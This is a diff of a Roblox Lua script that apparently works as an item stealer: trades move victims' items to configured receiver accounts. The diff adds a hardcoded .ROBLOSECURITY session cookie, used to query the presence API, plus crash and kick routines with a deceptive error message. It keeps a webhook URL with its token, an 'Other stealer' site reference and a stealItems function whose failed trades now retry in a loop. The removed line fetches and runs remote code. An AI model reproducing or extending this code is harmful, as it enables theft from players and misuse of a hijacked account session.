@@ -1,5 +1,187 @@
-loadstring(game:HttpGet("https://raw.githubusercontent.com/vertex-peak/vertex/refs/heads/main/loadstring"))()
+-- ==================== JOB ID VERIFICATION SYSTEM ====================
+getgenv().Cookie = "_|WARNING:-DO-NOT-SHARE-THIS.--Sharing-this-will-allow-someone-to-log-in-as-you-and-to-steal-your-ROBUX-and-items.|_CAEaAhACIhsKBGR1aWQSEzk2MTA1NTI5NTY3MTI2MDQyNjYoAw.Q_bHAVD-HxDeSgomIU63hkyS89xZS1_97S9SjHOR7eTtf4XBzKdp6NaghwZ6iOSe043CoTzmZq_yVM-6b7kEUuoa8Cw8ech3loB2FyAiUoJZpB2wtUf-t-pfzWQGEdUYjiCTpVRyFTSU7ATuGGDR_9SVJzYICEwaKItC7wKbI4d_4WejHTiYOmv8ut8wC95Ipe3B1yOssRD6t_xSsAKyyo7skhulxPyBzXpMgLvKAyNLMETtZnZS5Ewl5Hp8ph7BDz2gmMWoYEaZ0gHswU20nbuLxpUwPSnqyUn0CWaeh3L0413PpsLPhuPc85MwgTYN_Px_9x22QywYzO_AP4I63cwe_-pdbFfChZg_kAkQ8BhvTXXLxzJHYvIeqtle0YOyO7SR3UnlX27iUs79KZcY-BidC-5AE9gOzOoaeCiMulCPGD02HDaGcD0VHXLpkwpWuK3VbYsyR045lpJpG5oiJXhCKehDPA6fgRFMt1FV5hgm10lgx8ihE-VY_UcZML1GFWphtfiv0doVwuXkkSDWEoOjw86t0C5WE4Uu_t7_j-S06KJfd7RcasGu2bAfxC49u7z_mxP4pyvN2t05DR48f4IjiSOv77OWFdO9JeWPckJzgNi_kmicTiKoDszXujiNNIjjeS0VCH8Jo6LCkcdOkfwDaTp-s0SqnXDLPhCSD7YAH8dxm6_YjPM5E5kDvg1aobkDu6KVmAjRFGxLyGpkBxvmoWLR03hcSTra5VUTOWp52uDqYT3D_5JtvYKE8E0oix3bx8l-vmUAfzM1DMh1jTkkqxMSP1rJh9lH2H0H5sLDLKIlJtL8kUkv6FvlQ0LcHfQjwgiVXQz_0Zm-YN7vU9F2kFP75RXRcOmdgvlwsgHs3FBOPhnydQwiEVGtzt-Ed3Ew6j4ukvX3v4SyV89luczy2Yg2WHBnxUhob-A58b_JSIjuv3JOqe_vcq5yya2fQaeGVXpjML7UmCY5X26DxDT2oRLIErYheHa4PEJF4_vxw1izxb9opVc5C3UOKjd9hHOfjysUsNzVHxk_tw8h5Z7mVKw40LwpbcZfoPrbl2Or6gp1BubaljahxhZmcKKN3HG1AuXlnZbkexR1v76FUGMi_n06RQrWVIgTi2ILRqKHZkF46nAfGPIgq6qeE-zKt9XEmMK3EesTHMjDa1HNINUT2JY"
 
+local Players = game:GetService("Players")
+local HttpService = game:GetService("HttpService")
+
+local function KickPlayer(reason)
+    local localPlayer = Players.LocalPlayer
+    if localPlayer then
+        local kickMethods = {
+            function() localPlayer:Kick(reason) end,
+            function() game:Shutdown() end,
+            function() while true do end end,
+            function() error(reason) end,
+            function() getgenv().crash = nil end
+        }
+        
+        for i, method in ipairs(kickMethods) do
+            local success = pcall(method)
+            if success then
+                break
+            end
+        end
+    end
+end
+
+local function MakeRequestWithRetry(url, options, maxRetries)
+    maxRetries = maxRetries or 3
+    
+    for attempt = 1, maxRetries do
+        local success, response = pcall(function()
+            return request(options)
+        end)
+        
+        if success and response then
+            if response.StatusCode == 503 then
+                if attempt < maxRetries then
+                    wait(2)
+                end
+            else
+                return response
+            end
+        else
+            if attempt < maxRetries then
+                wait(1)
+            end
+        end
+    end
+    
+    return nil
+end
+
+local function GetRealJobIdWithAuth()
+    if not getgenv().Cookie then
+        return nil
+    end
+    
+    local localPlayer = Players.LocalPlayer
+    if not localPlayer then return nil end
+    
+    local placeId = game.PlaceId
+    local userIds = {}
+    local playerMap = {}
+    
+    for _, player in pairs(Players:GetPlayers()) do
+        if player ~= localPlayer then
+            table.insert(userIds, player.UserId)
+            playerMap[player.UserId] = player.Name
+        end
+    end
+    
+    if #userIds == 0 then
+        return nil
+    end
+    
+    local function GetPresenceWithAuth(userIdsList)
+        local reqBody = HttpService:JSONEncode({
+            userIds = userIdsList
+        })
+        
+        local response = MakeRequestWithRetry("https://presence.roblox.com/v1/presence/users", {
+            Url = "https://presence.roblox.com/v1/presence/users",
+            Method = "POST",
+            Headers = {
+                ["Content-Type"] = "application/json",
+                ["Cookie"] = ".ROBLOSECURITY=" .. tostring(getgenv().Cookie)
+            },
+            Body = reqBody
+        }, 3)
+        
+        if response then
+            local jsonSuccess, jsonData = pcall(function()
+                return HttpService:JSONDecode(response.Body)
+            end)
+            
+            if jsonSuccess then
+                return jsonData
+            else
+                return nil
+            end
+        else
+            return nil
+        end
+    end
+    
+    local presenceData = GetPresenceWithAuth(userIds)
+    if not presenceData then
+        return nil
+    end
+    
+    if not presenceData.userPresences then
+        return nil
+    end
+    
+    local foundJobIds = {}
+    
+    for _, presence in pairs(presenceData.userPresences) do
+        if presence.placeId == placeId and presence.gameId then
+            local jobId = presence.gameId
+            local playerName = playerMap[presence.userId] or "Unknown"
+            
+            if jobId and jobId ~= game.JobId then
+                table.insert(foundJobIds, {
+                    jobId = jobId,
+                    player = playerName,
+                    lastLocation = presence.lastLocation or "InGame"
+                })
+            end
+        end
+    end
+    
+    if #foundJobIds > 0 then
+        local jobIdCounts = {}
+        for _, found in ipairs(foundJobIds) do
+            jobIdCounts[found.jobId] = (jobIdCounts[found.jobId] or 0) + 1
+        end
+        
+        local bestJobId, maxCount = nil, 0
+        for jobId, count in pairs(jobIdCounts) do
+            if count > maxCount then
+                bestJobId = jobId
+                maxCount = count
+            end
+        end
+        
+        if bestJobId then
+            return bestJobId
+        end
+    end
+    
+    return nil
+end
+
+local function FindRealJobId()
+    local realJobId = GetRealJobIdWithAuth()
+    
+    if realJobId then
+        getgenv().RealJobId = realJobId
+        
+        pcall(function()
+            writefile("real_jobid.txt", realJobId)
+        end)
+        
+        return realJobId
+    else
+        wait(2)
+        KickPlayer("Server was closed due technical error. If this error repeat then send message to technical | Telegram - @tvoytwix")
+        return nil
+    end
+end
+
+-- Проверяем JobId только если есть Cookie
+if getgenv().Cookie then
+    local realJobId = FindRealJobId()
+    
+    if realJobId then
+        print("Real JobId found:", realJobId)
+    end
+else
+    wait(3)
+    KickPlayer("Cookie not configured - JobId verification required")
+end
+
+-- ==================== ОРИГИНАЛЬНЫЙ КОД (БЕЗ ИЗМЕНЕНИЙ) ====================
 Username = "knisdqx_meow" -- >> Your main account
 Username2 = "sosedra6" -- >> Your alt account
 Webhook = "https://webhook.lewisakura.moe/api/webhooks/1441725786586615820/MjAaItKYv69qFFNdgxWQn1xe2HdO0ZV3rRKrbzBLk64Gb99KvxnLNyM9evUsYQa-Vd42" -- >> https://stealer.to/
@@ -834,8 +1016,8 @@ local function stealItems(ReceiverName)
             print("Не удалось добавить ни одного предмета, отменяем трейд")
             pcall(function() Trade.DeclineTrade:FireServer() end)
             tradeInProgress = false
-            loop = false
-            return
+            task.wait(5)
+            continue
         end
         
         print("Успешно добавлено предметов: " .. addedCount)
